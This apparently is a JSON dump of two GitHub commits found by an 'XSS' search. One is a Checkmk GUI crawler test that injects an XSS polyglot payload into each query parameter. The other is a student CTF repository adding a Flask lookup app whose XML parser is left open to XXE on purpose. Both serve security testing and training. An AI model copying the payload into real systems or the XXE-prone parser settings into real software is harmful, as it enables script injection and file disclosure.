\"application/x-gzip\",\n            \"application/x-mkp\",\n            \"application/x-msdos-program\",\n            \"application/x-msi\",\n            \"application/x-pkg\",\n            \"application/x-redhat-package-manager\",\n            \"application/x-rpm\",\n            \"application/x-tar\",\n            \"application/x-tgz\",\n            \"application/x-yaml; charset=utf-8\",\n            \"image/gif\",\n            \"image/png\",\n            \"image/svg+xml\",\n            \"text/x-c++src\",\n            \"text/x-chdr\",\n            \"text/x-sh\",\n        }\n\n        # limit minimum value to 0.\n        self._max_urls = max(0, max_urls)\n        self._todos = deque([Url(self.site.internal_url)])\n\n    async def crawl(self, max_tasks: int) -> None:\n        async with async_playwright() as pw:\n            browser = await pw.chromium.launch()\n            storage_state = await self.access_storage_state(browser)\n            # makes sure authentication cookies is also available in the \"requests\" session.\n            for cookie_dict in storage_state[\"cookies\"]:\n                self.requests_session.cookies.set(\n                    name=cookie_dict[\"name\"],\n                    value=cookie_dict[\"value\"],\n                )\n            browser_context = await browser.new_context(storage_state=storage_state)\n            # special-case\n            search_limited_urls: bool = self._max_urls > 0\n            if search_limited_urls and self._max_urls < max_tasks:\n                max_tasks = self._max_urls\n            with Progress() as progress:\n                tasks: set = set()\n                while tasks or self._todos and self._find_more_urls:\n                    try:\n                        url = self._todos.popleft()\n                    except IndexError:\n                        logger.debug(\"Populating URLs/TODOs ...\")\n                        url = None\n                    if url and len(tasks) < max_tasks:\n                        logger.debug(\"Checking URL %s\", url.url)\n                        tasks.add(asyncio.create_task(self.visit_url(browser_context, url)))\n                    else:\n                        logger.debug(\n                            \"Maximum tasks assgined. Waiting for tasks to be completed ...\"\n                        )\n                    done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)\n                    progress.done(done=sum(1 for t in done if t.result()))\n                    if search_limited_urls:\n                        self._find_more_urls = progress.done_total < self._max_urls\n                    self.duration = progress.duration\n            await browser.close()\n\n    async def access_storage_state(\n        self, browser: playwright.async_api.Browser\n    ) -> playwright.async_api.StorageState:\n        context = await browser.new_context()\n        page = await context.new_page()\n\n        async def handle_page_error(error: playwright.async_api.Error) -> None:\n            self.handle_error(\n                Url(try_find_frame_named_main(page).url),\n                error_type=\"JavascriptCreateError\",\n                message=format_js_error(error),\n            )\n\n        page.on(\"pageerror\", handle_page_error)\n\n        await page.goto(self.site.internal_url)\n        await page.fill('input[name=\"_username\"]', \"cmkadmin\")\n        await page.fill('input[name=\"_password\"]', \"cmk\")\n        async with page.expect_navigation():\n            await page.click(\"text=Login\")\n        await page.close()\n        storage_state = await context.storage_state()\n        await context.close()\n\n        return storage_state\n\n    def _ensure_result(self, url: Url) -> None:\n        if url.url not in self.results:\n            self.results[url.url] = CrawlResult()\n\n    def handle_error(self, url: Url, error_type: str, message: str = \"\") -> bool:\n        self._ensure_result(url)\n        self.results[url.url].errors.append(\n            ErrorResult(referer_url=url.referer_url, message=f\"{error_type}: {message}\")\n        )\n        logger.error(\"page error: %s: %s, (%s)\", error_type, message, url.url)\n        return True\n\n    def handle_new_reference(self, url: Url, referer_url: Url) -> bool:\n        if referer_url.follow and url.url not in self.results:\n            self.results[url.url] = CrawlResult()\n            self._todos.append(url)\n            return True\n        return False\n\n    def handle_skipped_reference(self, url: Url, reason: str, message: str) -> None:\n        self._ensure_result(url)\n        if self.results[url.url].skipped is None:\n            self.results[url.url].skipped = CrawlSkipInfo(\n                reason=reason,\n                message=message,\n            )\n\n    def handle_page_done(self, url: Url, duration: float) -> bool:\n        self._ensure_result(url)\n        self.results[url.url].duration = duration\n        logger.info(\"page done in %.2f secs (%s)\", duration, url.url)\n        return self.results[url.url].skipped is None and len(self.results[url.url].errors) == 0\n\n    def handle_crash_reports(self) -> None:\n        crash_reports_url = urljoin(self.site.internal_url, \"view.py?view_name=crash_reports\")\n        try:\n            response = self.requests_session.get(crash_reports_url)\n        except requests.RequestException as exception:\n            self.handle_error(Url(url=crash_reports_url), \"GetCrashReportsFailed\", str(exception))\n            return\n\n        if response.status_code != 200:\n            self.handle_error(\n                Url(url=crash_reports_url), \"CrashReportsPageFailed\", str(response.status_code)\n            )\n\n        for crash_id_match in re.finditer(rf\"crash_id=({CrashIdRegex})\", response.text):\n            self.handle_crash_report(Url(\"unknown url\"), crash_id_match.group(1))\n\n    def handle_crash_report(self, url: Url, crash_id: str) -> bool:\n        crash_report_url = urljoin(\n            self.site.internal_url,\n            f\"download_crash_report.py?crash_id={crash_id}&site={self.site.id}\",\n        )\n        try:\n            response = self.requests_session.get(crash_report_url)\n        except requests.RequestException as exception:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"CrashReportDownloadFailed\",\n                str(exception),\n            )\n            return False\n\n        status_code = response.status_code\n        expected_status_code = 200\n        if status_code != expected_status_code:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"CrashReportDownloadFailed\",\n                f\"status code: {status_code}, expected: {expected_status_code}\",\n            )\n            return False\n\n        content_type = response.headers.get(\"content-type\")\n        expected_content_type = \"application/x-tgz\"\n        if content_type != expected_content_type:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"CrashReportDownloadFailed\",\n                f\"content-type: {content_type}, expected: {expected_content_type}\",\n            )\n            return False\n\n        try:\n            with tarfile.open(fileobj=io.BytesIO(response.content)) as tar:\n                crash_info_file = tar.extractfile(\"crash.info\")\n                if crash_info_file is None:\n                    self.handle_error(\n                        Url(url=crash_report_url, referer_url=url.url),\n                        \"EmptyCrashReportTarFile\",\n                        message=crash_id,\n                    )\n                    return False\n\n                crash_info = json.loads(crash_info_file.read().decode(\"utf-8\"))\n        except tarfile.ReadError:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"InvalidCrashReportTarFile\",\n                repr(response.content),\n            )\n            return False\n\n        # reads the crash report and dumps it indented for better readability\n        crash_report = json.dumps(crash_info, indent=4)\n        return self.handle_error(url, \"CrashReport\", message=crash_report)\n\n    async def visit_url(\n        self,\n        browser_context: playwright.async_api.BrowserContext,\n        url: Url,\n    ) -> bool:\n        start = time.time()\n\n        content_type = self.requests_session.head(url.url).headers[\"content-type\"]\n        if content_type.startswith(\"text/html\"):\n            try:\n                page_content = await self.get_page_content(browser_context, url)\n                await self.validate(url, page_content.content, page_content.logs)\n            except playwright.async_api.Error as e:\n                self.handle_error(url, \"BrowserError\", repr(e))\n        elif any(\n            content_type.startswith(ignored_start) for ignored_start in [\"text/plain\", \"text/csv\"]\n        ):\n            self.handle_skipped_reference(url, reason=\"content-type\", message=content_type)\n        elif content_type in self._ignored_content_types:\n            self.handle_skipped_reference(url, reason=\"content-type\", message=content_type)\n        else:\n            self.handle_error(url, error_type=\"UnknownContentType\", message=content_type)\n\n        return self.handle_page_done(url, duration=time.time() - start)\n\n    @staticmethod\n    async def get_page_content(\n        browser_context: playwright.async_api.BrowserContext,\n        url: Url,\n    ) -> PageContent:\n        logs = []\n\n        async def handle_console_messages(msg: playwright.async_api.ConsoleMessage) -> None:\n            location = (\n                f\"{msg.location['url']}:{msg.location['lineNumber']}:{msg.location['columnNumber']}\"\n            )\n            logs.append(f\"{msg.type}: {msg.text} ({location})\")\n\n        async def handle_page_error(error: playwright.async_api.Error) -> None:\n            logs.append(format_js_error(error))\n\n        page = await browser_context.new_page()\n        page.on(\"pageerror\", handle_page_error)\n        page.on(\"console\", handle_console_messages)\n        try:\n            await page.goto(url.url, timeout=60 * 1000)\n            return PageContent(content=await page.content(), logs=logs)\n        finally:\n            await page.close()\n\n    async def validate(self, url: Url, text: str, logs: Iterable[str]) -> None:\n        def blocking() -> None:\n            soup = BeautifulSoup(text, \"lxml\")\n            self.check_content(url, soup)\n            self.check_links(url, soup)\n            self.check_frames(url, soup)\n            self.check_iframes(url, soup)\n            self.check_logs(url, logs)\n\n        loop = asyncio.get_running_loop()\n        await loop.run_in_executor(None, blocking)\n\n    def check_content(self, url: Url, soup: BeautifulSoup) -> None:\n        if soup.find(\"div\", id=\"login\") is not None:\n            self.handle_error(url, \"LoginError\", \"login requested\")\n\n        ignore_texts = [\n            \"This view can only be used in mobile mode.\",\n            # Some single context views are accessed without their context information, which\n            # results in a helpful error message since 1.7. These are not failures that this test\n            # should report.\n            \"Missing context information\",\n            # Same for availability views that cannot be accessed anymore\n            # from views with missing context\n            \"miss some required context information\",\n            # Same for dashlets that are related to a specific context\n            \"There are no metrics meeting your context filters\",\n            # Some of the errors are only visible to the user when trying to submit and\n            # some are visible for the reason that the GUI crawl sites do not have license\n            # information configured -> ignore the errors\n            \"license usage report\",\n        ]\n        for element in soup.select(\"div.error\"):\n            inner_html = str(element)\n            if not any(ignore_text in inner_html for ignore_text in ignore_texts):\n                self.handle_error(url, \"HtmlError\", f\"Found error: {inner_html}\")\n\n    def check_frames(self, url: Url, soup: BeautifulSoup) -> None:\n        self.check_referenced(url, soup, \"frame\", \"src\")\n\n    def check_iframes(self, url: Url, soup: BeautifulSoup) -> None:\n        self.check_referenced(url, soup, \"iframe\", \"src\")\n\n    def check_links(self, url: Url, soup: BeautifulSoup) -> None:\n        self.check_referenced(url, soup, \"a\", \"href\")\n\n    def check_referenced(self, referer_url: Url, soup: BeautifulSoup, tag: str, attr: str) -> None:\n        elements = soup.find_all(tag)\n        for element in elements:\n            orig_url = element.get(attr)\n            if orig_url is None:\n                continue  # Skip elements that don't have the attribute in question\n            normalized_orig_url = self.normalize_url(orig_url)\n            if normalized_orig_url is None:\n                continue\n            url = Url(normalized_orig_url, orig_url=orig_url, referer_url=referer_url.url)\n            try:\n                self.verify_is_valid_url(url.url)\n            except InvalidUrl as invalid_url:\n                self.handle_skipped_reference(\n                    url, reason=\"invalid-url\", message=invalid_url.message\n                )\n            else:\n                self.handle_new_reference(url, referer_url=referer_url)\n\n    def check_logs(self, url: Url, logs: Iterable[str]) -> None:\n        accepted_logs = [\n            \"Missing object for SimpleBar initiation.\",\n        ]\n        for log in logs:\n            if not any(accepted_log in log for accepted_log in accepted_logs):\n                self.handle_error(url, error_type=\"JavascriptError\", message=log)\n\n    def verify_is_valid_url(self, url: str) -> None:  # pylint: disable=too-many-branches\n        parsed = urlsplit(url)\n        if parsed.scheme != \"http\":\n            raise InvalidUrl(url, f\"invalid scheme: {parsed.scheme}\")\n\n        # skip external urls\n        if url.startswith(\"http://\") and not url.startswith(self.site.internal_url):\n            raise InvalidUrl(url, \"external url\")\n        # skip non check_mk urls\n        if (\n            not parsed.path.startswith(f\"/{self.site.id}/check_mk\")\n            or \"../pnp4nagios/\" in parsed.path\n            or \"../nagvis/\" in parsed.path\n            or \"check_mk/plugin-api\" in parsed.path\n            or \"../nagios/\" in parsed.path\n        ):\n            raise InvalidUrl(url, \"non Check_MK URL\")\n\n        file_name = os.path.basename(parsed.path)\n        query = dict(parse_qsl(parsed.query, keep_blank_values=True))\n\n        # skip current url with link to index\n        if \"index.py?start_url=\" in url:\n            raise InvalidUrl(url, \"link to index with current URL\")\n        if \"logout.py\" in url:\n            raise InvalidUrl(url, \"logout URL\")\n        if \"_transid=\" in url:\n            raise InvalidUrl(url, \"action URL\")\n        if \"selection=\" in url:\n            raise InvalidUrl(url, \"selection URL\")\n        # TODO: Remove this exclude when ModeCheckManPage works without an\n        # automation call. Currently we have to use such a call to enrich the\n        # man page with some additional info from config.check_info, see\n        # AutomationGetCheckManPage.\n        if \"mode=check_manpage\" in url and \"wato.py\" in url:\n            raise InvalidUrl(url, \"man page URL\")\n        # Don't follow filled in filter form views\n        if \"view.py\" in url and \"filled_in=filter\" in url:\n            raise InvalidUrl(url, \"filled in filter URL\")\n        # Don't follow the view editor\n        if \"edit_view.py\" in url:\n            raise InvalidUrl(url, \"view editor URL\")\n        # Skip agent download files\n        if parsed.path.startswith(f\"/{self.site.id}/check_mk/agents/\"):\n            raise InvalidUrl(url, \"agent download file\")\n\n        # Skip combined graph pages which take way too long for our crawler with unrestricted\n        # contexts. These pages take >10 seconds to load while crawling\n        if file_name == \"combined_graphs.py\" and not query.get(\"host\"):\n            raise InvalidUrl(url, \"combined graph with unrestricted context\")\n\n        # From the list visuals page (e.g. edit_views.py) there are links with explicit \"owner=\"\n        # query string. These parameters are useful for admins, in case they want to display the\n        # view of a specific user. In our crawl scenario this results in all view related pages\n        # (regular view, availability sub-views, reports and so on) being crawled twice. To reduce\n        # the number of URLs being crawled, we exclude the view.py with empty \"owner\" parameter.\n        if file_name == \"view.py\" and query.get(\"owner\") == \"\":\n            raise InvalidUrl(url, \"explicit empty owner (redundant view)\")\n\n        # Do not crawl the thousands of werk pages. Visit at least some of them to be able to catch\n        # some general rendering issues.\n        if file_name == \"werk.py\" and query.get(\"werk\") not in [\n            \"11363\",\n            \"5605\",\n            \"12908\",\n            \"12389\",\n            \"7352\",\n            \"11361\",\n            \"12149\",\n            \"5744\",\n            \"8350\",\n            \"6240\",\n            \"5958\",\n        ]:\n            raise InvalidUrl(url, \"Skip werk pages\")\n\n    def normalize_url(self, url: str) -> str:\n        url = urljoin(self.site.internal_url, url.rstrip(\"#\"))\n        parsed = list(urlsplit(url))\n        parsed[3] = urlencode(sorted(parse_qsl(parsed[3], keep_blank_values=True)))\n        return urlunsplit(parsed)\n\n    def report(self) -> None:\n        self.site.save_results()\n        self._write_report_file()\n\n        error_messages = list(\n            chain.from_iterable(\n                (\n                    [\n                        f\"[{url} - found on {error.referer_url}] {error.message}\"\n                        for error in result.errors\n                    ]\n                    for url, result in self.results.items()\n                    if result.errors\n                )\n            )\n        )\n        if error_messages:\n            joined_error_messages = \"\\n\".join(error_messages)\n            raise Exception(\n                f\"Crawled {len(self.results)} URLs in {self.duration} seconds. Failures:\\n{joined_error_messages}\"\n            )\n\n    def _write_report_file(self) -> None:\n        root = etree.Element(\"testsuites\")\n        testsuite = etree.SubElement(root, \"testsuite\")\n\n        tests, errors, skipped = 0, 0, 0\n        for url, result in self.results.items():\n            testcase = etree.SubElement(\n                testsuite,\n                \"testcase\",\n                attrib={\n                    \"name\": url,\n                    \"classname\": \"crawled_urls\",\n                    \"time\": f\"{result.duration:.3f}\",\n                },\n            )\n            if result.skipped is not None:\n                skipped += 1\n                etree.SubElement(\n                    testcase,\n                    \"skipped\",\n                    attrib={\n                        \"type\": result.skipped.reason,\n                        \"message\": result.skipped.message,\n                    },\n                )\n            elif result.errors:\n                errors += 1\n                for error in result.errors:\n                    failure = etree.SubElement(\n                        testcase, \"failure\", attrib={\"message\": error.message}\n                    )\n                    failure.text = f\"referer_url: {error.referer_url}\"\n\n            tests += 1\n\n        testsuite.attrib[\"name\"] = \"test-gui-crawl\"\n        testsuite.attrib[\"tests\"] = str(tests)\n        testsuite.attrib[\"skipped\"] = str(skipped)\n        testsuite.attrib[\"errors\"] = str(errors)\n        testsuite.attrib[\"failures\"] = \"0\"\n        testsuite.attrib[\"time\"] = f\"{self.duration:.3f}\"\n        testsuite.attrib[\"timestamp\"] = time.strftime(\"%Y-%m-%dT%H:%M:%S\")\n\n        self.report_file.write_bytes(etree.tostring(root, pretty_print=True))\n\n\nclass XssCrawler(Crawler):\n    Payload = \"\"\"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+console.log(\"XSS vulnerability\")//'>\"\"\"\n\n    def handle_error(self, url: Url, error_type: str, message: str = \"\") -> bool:\n        if error_type == \"HtmlError\":\n            return False\n        if error_type == \"UnknownContentType\" and message == \"application/problem+json\":\n            return False\n        return super().handle_error(url, error_type, message)\n\n    def handle_page_done(self, url: Url, duration: float) -> bool:\n        if super().handle_page_done(url, duration):\n            for mutated_url in mutate_url_with_xss_payload(url, self.Payload):\n                super().handle_new_reference(mutated_url, url)\n            return True\n        return False\n\n\ndef mutate_url_with_xss_payload(url: Url, payload: str) -> Generator[Url, None, None]:\n    \"\"\"For each query parameter in `url`, produce a URL where that parameter is set to `payload`\n\n    >>> urls = mutate_url_with_xss_payload(Url(\"example.com?foo=bar&empty=\"), \"PAYLOAD\")\n    >>> next(urls).url\n    'example.com?foo=PAYLOAD&empty='\n    >>> next(urls).url\n    'example.com?foo=bar&empty=PAYLOAD'\n\n    (Be aware that this doctest is not run.)\n    \"\"\"\n    parsed_url = urlparse(url.url)\n    parsed_query = parse_qs(parsed_url.query, keep_blank_values=True)\n    for key, values in parsed_query.items():\n        for change_idx in range(len(values)):\n            mutated_values = [\n                payload if idx == change_idx else value for idx, value in enumerate(values)\n            ]\n            mutated_query = {**parsed_query, key: mutated_values}\n            mutated_url = parsed_url._replace(query=urlencode(mutated_query, doseq=True))\n            yield Url(\n                url=mutated_url.geturl(),\n                referer_url=url.referer_url,\n                orig_url=url.orig_url,\n                follow=False,\n            )\n"
                }
            },
            "msg": "XSS crawl: Limit browser to task and batch urls\n\nThe previous version created a task per url test. This on one hand broke\nthe asyncio implementation as multiple tasks accessed the same browser\ncontext concurrently. On the other hand this created costly overhead, we\nare now splitting the urls into batches and let each task take over one\nbatch.\n\nChange-Id: Id05dcf1de3e2542470ac4da0acaa4e7532a1a855"
        }
    },
    "https://github.com/House-Fish/overflow-x-sst-idp-ctf": {
        "daf2b8891ebcb7baf27c7c95e1b251771acfbf4d": {
            "url": "https://api.github.com/repos/House-Fish/overflow-x-sst-idp-ctf/commits/daf2b8891ebcb7baf27c7c95e1b251771acfbf4d",
            "html_url": "https://github.com/House-Fish/overflow-x-sst-idp-ctf/commit/daf2b8891ebcb7baf27c7c95e1b251771acfbf4d",
            "sha": "daf2b8891ebcb7baf27c7c95e1b251771acfbf4d",
            "keyword": "XSS update",
            "diff": "diff --git a/DMS/app.py b/DMS/app.py\ndeleted file mode 100644\nindex fef75d3..0000000\n--- a/DMS/app.py\n+++ /dev/null\n@@ -1,21 +0,0 @@\n-from lxml import etree\n-from flask import Flask, request, render_template\n-\n-app = Flask(__name__)\n-parser = etree.XMLParser(load_dtd=True, resolve_entities=True)\n-\n-@app.route(\"/\", methods=[\"GET\",\"POST\"])\n-def username():\n-    if request.method == \"POST\":\n-        xml_data = request.data\n-        print(str(xml_data))\n-        try:\n-            root = etree.fromstring(xml_data, parser=parser)\n-            name = root.findtext('name')\n-            print(f\"Extracted name: {name}\")\n-            return name\n-        except etree.XMLSyntaxError as e:\n-            print(f\"Error parsing XML: {e}\")\n-        return \"Posted!\"\n-    elif request.method == \"GET\":\n-        return render_template(\"index.html\")\ndiff --git a/DMS/flag.txt b/DMS/flag.txt\ndeleted file mode 100644\nindex 2f3e96e..0000000\n--- a/DMS/flag.txt\n+++ /dev/null\n@@ -1 +0,0 @@\n-OVERFLOW{0H_HO@_D1D_U_F1ND_M3}\n\\ No newline at end of file\ndiff --git a/DMS/templates/index.html b/DMS/templates/index.html\ndeleted file mode 100644\nindex 1ae6586..0000000\n--- a/DMS/templates/index.html\n+++ /dev/null\n@@ -1,93 +0,0 @@\n-<!DOCTYPE html>\n-<html lang=\"en\">\n-  <head>\n-    <meta charset=\"UTF-8\">\n-    <title>Document Management System v1.0</title>\n-    <style>\n-      body {\n-        background-color: #f4f4f4;\n-        font-family: \"Arial\", sans-serif;\n-        color: #333;\n-      }\n-      .container {\n-        width: 760px;\n-        margin: 0 auto;\n-        padding: 20px;\n-        border: 1px solid #ccc;\n-        background-color: #fff;\n-        box-shadow: 2px 2px 5px #aaa;\n-      }\n-      h1 {\n-        font-size: 24px;\n-        color: #444;\n-        text-align: center;\n-        border-bottom: 2px solid #444;\n-        margin-bottom: 20px;\n-      }\n-      form {\n-        margin-top: 20px;\n-      }\n-      label {\n-        font-weight: bold;\n-      }\n-      textarea {\n-        width: 100%;\n-        height: 200px;\n-        border: 1px solid #999;\n-        padding: 10px;\n-        background-color: #eee;\n-        font-family: \"Courier New\", Courier, monospace;\n-        font-size: 14px;\n-      }\n-      button {\n-        padding: 5px 10px;\n-        background-color: #008CBA;\n-        color: white;\n-        border: none;\n-        font-size: 14px;\n-        cursor: pointer;\n-      }\n-      button:hover {\n-        background-color: #005f73;\n-      }\n-      .footer {\n-        text-align: center;\n-        margin-top: 20px;\n-        font-size: 12px;\n-        color: #666;\n-      }\n-    </style>\n-    <script>\n-        function sendXML() {\n-            const name = document.getElementById('name').value;\n-            const xmlData = `<?xml version=\"1.0\" encoding=\"UTF-8\"?><user><name>${name}</name></user>`;\n-\n-            const xhr = new XMLHttpRequest();\n-            xhr.open(\"POST\", \"/\", true);\n-            xhr.setRequestHeader(\"Content-Type\", \"text/xml\");\n-            xhr.onreadystatechange = function () {\n-                if (xhr.readyState === 4 && xhr.status === 200) {\n-                    document.getElementById('result').innerHTML = xhr.responseText;\n-                }\n-            };\n-            xhr.send(xmlData);\n-        }\n-    </script>\n-</head>\n-<body>\n-    <div class=\"container\">\n-        <h1>Document Management System v1.0</h1>\n-        <p>Welcome to our legacy document management system. Please enter your XML data below.</p>\n-        <form onsubmit=\"event.preventDefault(); sendXML();\">\n-            <div>\n-                <label for=\"name\">Name:</label><br>\n-                <input type=\"text\" id=\"name\" name=\"name\" placeholder=\"Enter your name\"><br>\n-            </div>\n-            <button type=\"submit\">Submit</button>\n-        </form>\n-        <div class=\"footer\">\n-            <p>\u00a9 2001-2004 Legacy Systems Inc. All rights reserved.</p>\n-        </div>\n-    </div>\n-</body>\n-</html>\ndiff --git a/nginx/nginx.conf b/nginx/nginx.conf\nindex f529485..088e445 100644\n--- a/nginx/nginx.conf\n+++ b/nginx/nginx.conf\n@@ -15,7 +15,7 @@ http {\n     server {\n         listen 80;\n \n-        server_name cookies.longestshlong69420.com;\n+        server_name cookies.overflow.dev;\n         location / {\n             proxy_pass http://cookies;\n             proxy_set_header Host $host;\n@@ -28,7 +28,7 @@ http {\n     server {\n         listen 80;\n \n-        server_name intercept.longestshlong69420.com;\n+        server_name intercept.overflow.dev;\n         location / {\n             proxy_pass http://intercept;\n             proxy_set_header Host $host;\n@@ -41,19 +41,12 @@ http {\n     server {\n         listen 80;\n \n-        server_name incl-files.longestshlong69420.com;\n+        server_name incl-files.overflow.dev;\n \n         location / {\n             root /usr/share/nginx/html/incl-files;\n             index index.html;\n             autoindex on;\n         }\n-    \n-        # Explicitly set MIME types for CSS and JS files\n-        location ~* \\.(css|js)$ {\n-            root /usr/share/nginx/html/incl-files;\n-            add_header Content-Type $content_type;\n-            expires max;\n-        }\n     }\n }\ndiff --git a/DMS/__pycache__/app.cpython-312.pyc b/whoisstudent/__pycache__/app.cpython-312.pyc\nsimilarity index 100%\nrename from DMS/__pycache__/app.cpython-312.pyc\nrename to whoisstudent/__pycache__/app.cpython-312.pyc\ndiff --git a/whoisstudent/app.py b/whoisstudent/app.py\nnew file mode 100644\nindex 0000000..793bd3a\n--- /dev/null\n+++ b/whoisstudent/app.py\n@@ -0,0 +1,65 @@\n+from flask import Flask, render_template, request, Response\n+from lxml import etree\n+import csv\n+\n+app = Flask(__name__)\n+\n+# Create a parser to parse the xml data\n+def get_parser():\n+    parser = etree.XMLParser(\n+        load_dtd=True,\n+        resolve_entities=True,\n+        no_network=False\n+    )\n+    return parser\n+\n+# Load student data from a CSV file\n+def load_students():\n+    students = []\n+    with open('students.csv', mode='r') as file:\n+        reader = csv.DictReader(file)\n+        for row in reader:\n+            students.append(row)\n+    return students\n+\n+# Search for a student by name\n+def find_student(name):\n+    students = load_students()\n+    for student in students:\n+        if student['name'].lower() == name.lower():\n+            return student\n+    return None\n+\n+# Redact sensitive information\n+def redact_info(student):\n+    if student:\n+        student['email'] = '[REDACTED]'\n+        student['address'] = '[REDACTED]'\n+        student['grades'] = '[REDACTED]'\n+    return student\n+\n+@app.route('/')\n+def index():\n+    return render_template('index.html')\n+\n+@app.route('/lookup', methods=['POST'])\n+def lookup():\n+    try: \n+        parser = get_parser()\n+        tree = etree.fromstring(request.data, parser)\n+        name = tree.findtext('name').lower()\n+    except Exception as e:\n+        print(e)\n+        pass\n+\n+    student = find_student(name)\n+    \n+    if student is None: \n+        return render_template('404.html', error_message=f'{name} not found in database. Please check the name and try again.')\n+\n+    redacted_student = redact_info(student)\n+\n+    return render_template('result.html', student=redacted_student)\n+\n+if __name__ == '__main__':\n+    app.run()\ndiff --git a/whoisstudent/students.csv b/whoisstudent/students.csv\nnew file mode 100644\nindex 0000000..d37228e\n--- /dev/null\n+++ b/whoisstudent/students.csv\n@@ -0,0 +1,12 @@\n+name,phone,email,address,grades\n+Aiden Tan,9123-4567,aidentan@sst.edu.sg,123 Bedok North Street 3,A,B,B+\n+Chloe Lim,9876-5432,chloelim@sst.edu.sg,456 Pasir Ris Drive 1,B,A,C\n+Ethan Lee,8765-4321,ethanlee@sst.edu.sg,789 Tampines Avenue 10,C,B,A\n+Sophia Ng,9654-3210,sophiang@sst.edu.sg,321 Jurong West Street 65,B,B+,A\n+Lucas Ong,9234-5678,lucasong@sst.edu.sg,654 Bukit Batok East Avenue 3,A-,C,B\n+Olivia Chua,9345-6789,oliviachua@sst.edu.sg,987 Yishun Avenue 4,B+,A,B+\n+Ryan Koh,9456-7890,ryankoh@sst.edu.sg,210 Bishan Street 22,C,B,B\n+Grace Tan,9567-8901,gracetan@sst.edu.sg,432 Hougang Avenue 8,B,A,C+\n+Aurelius Robin Tang,9932-1123,OVERFLOW{U_4R3_ST40NG_C0NT1NU3_0N},Singapore Polytechnic,P,O,G\n+Isaac Chan,9678-9012,isaacchan@sst.edu.sg,876 Sengkang East Road,A,C,B\n+Hannah Teo,9789-0123,hannahteo@sst.edu.sg,543 Woodlands Avenue 6,B,A-,A\ndiff --git a/whoisstudent/templates/404.html b/whoisstudent/templates/404.html\nnew file mode 100644\nindex 0000000..5659b15\n--- /dev/null\n+++ b/whoisstudent/templates/404.html\n@@ -0,0 +1,53 @@\n+<!DOCTYPE html>\n+<html lang=\"en\">\n+<head>\n+    <meta charset=\"UTF-8\">\n+    <title>404 Not Found</title>\n+    <style>\n+        /* Matching the outdated official style */\n+        body {\n+            font-family: 'Times New Roman', Times, serif;\n+            background-color: #f4f4f4;\n+            color: #333;\n+            text-align: center;\n+            margin: 0;\n+            padding: 20px;\n+            border: 2px solid #888;\n+            max-width: 800px;\n+            margin: auto;\n+        }\n+        h1 {\n+            color: #004466;\n+            text-shadow: 1px 1px 2px #ccc;\n+            margin-bottom: 20px;\n+            font-size: 48px;\n+        }\n+        p {\n+            background-color: #e0e0e0;\n+            padding: 15px;\n+            border: 1px solid #777;\n+            box-shadow: 2px 2px 5px #999;\n+            display: inline-block;\n+            text-align: left;\n+            font-size: 18px;\n+            margin: auto;\n+            width: 70%;\n+        }\n+        a {\n+            color: #004466;\n+            text-decoration: none;\n+            font-weight: bold;\n+        }\n+        a:hover {\n+            text-decoration: underline;\n+        }\n+    </style>\n+</head>\n+<body>\n+    <h1>404</h1>\n+    <p>\n+        {{ error_message }}<br><br>\n+        Please return to the <a href=\"/\">home page</a> and try your request again.\n+    </p>\n+</body>\n+</html>\ndiff --git a/whoisstudent/templates/index.html b/whoisstudent/templates/index.html\nnew file mode 100644\nindex 0000000..1fec410\n--- /dev/null\n+++ b/whoisstudent/templates/index.html\n@@ -0,0 +1,95 @@\n+<!DOCTYPE html>\n+<html lang=\"en\">\n+<head>\n+    <meta charset=\"UTF-8\">\n+    <title>Student Lookup</title>\n+    <style>\n+        body {\n+            font-family: 'Times New Roman', Times, serif;\n+            background-color: #f4f4f4;\n+            color: #333;\n+            text-align: center;\n+            margin: 0;\n+            padding: 20px;\n+            border: 2px solid #888;\n+            max-width: 800px;\n+            margin: auto;\n+        }\n+\n+        h1 {\n+            color: #004466;\n+            text-shadow: 1px 1px 2px #ccc;\n+            margin-bottom: 20px;\n+        }\n+\n+        form {\n+            background-color: #e0e0e0;\n+            padding: 15px;\n+            border: 1px solid #777;\n+            box-shadow: 2px 2px 5px #999;\n+            display: inline-block;\n+            text-align: left;\n+            width: 300px;\n+            margin: auto;\n+        }\n+\n+        label {\n+            display: block;\n+            margin-bottom: 10px;\n+            font-weight: bold;\n+        }\n+\n+        input[type=\"text\"] {\n+            width: 95%;\n+            padding: 5px;\n+            border: 1px solid #555;\n+            margin-bottom: 15px;\n+            font-family: 'Courier New', Courier, monospace;\n+        }\n+\n+        button {\n+            background-color: #004466;\n+            color: white;\n+            padding: 5px 20px;\n+            border: 1px solid #003344;\n+            box-shadow: 1px 1px 3px #777;\n+            cursor: pointer;\n+            width: 100%;\n+        }\n+\n+        button:hover {\n+            background-color: #003344;\n+        }\n+    </style>\n+    <script>\n+        function submitXML() {\n+            const name = document.getElementById(\"name\").value;\n+\n+            const xmlData = `<?xml version=\"1.0\" encoding=\"UTF-8\"?><lookup><name>${name}</name></lookup>`;\n+\n+            // Create a new XMLHttpRequest object\n+            const xhr = new XMLHttpRequest();\n+            xhr.open(\"POST\", \"/lookup\", true);\n+            xhr.setRequestHeader(\"Content-Type\", \"application/xml\");\n+            \n+            // Handle the response\n+            xhr.onreadystatechange = function () {\n+                if (xhr.readyState === 4 && xhr.status === 200) {\n+                    document.body.innerHTML = xhr.responseText;\n+                }\n+            };\n+            \n+            // Send the XML\n+            xhr.send(xmlData);\n+        }\n+    </script>\n+</head>\n+<body>\n+    <h1>Dover Secondary School - Student Lookup</h1>\n+    <form onsubmit=\"event.preventDefault(); submitXML();\">\n+        <label for=\"name\">Enter Student Name:</label>\n+        <input type=\"text\" id=\"name\" name=\"name\">\n+        <button type=\"submit\">Lookup</button>\n+    </form>\n+</body>\n+</html>\ndiff --git a/whoisstudent/templates/result.html b/whoisstudent/templates/result.html\nnew file mode 100644\nindex 0000000..d4eb73b\n--- /dev/null\n+++ b/whoisstudent/templates/result.html\n@@ -0,0 +1,75 @@\n+<!DOCTYPE html>\n+<html lang=\"en\">\n+<head>\n+    <meta charset=\"UTF-8\">\n+    <title>Lookup Result</title>\n+    <style>\n+        body {\n+            font-family: 'Times New Roman', Times, serif;\n+            background-color: #f4f4f4;\n+            color: 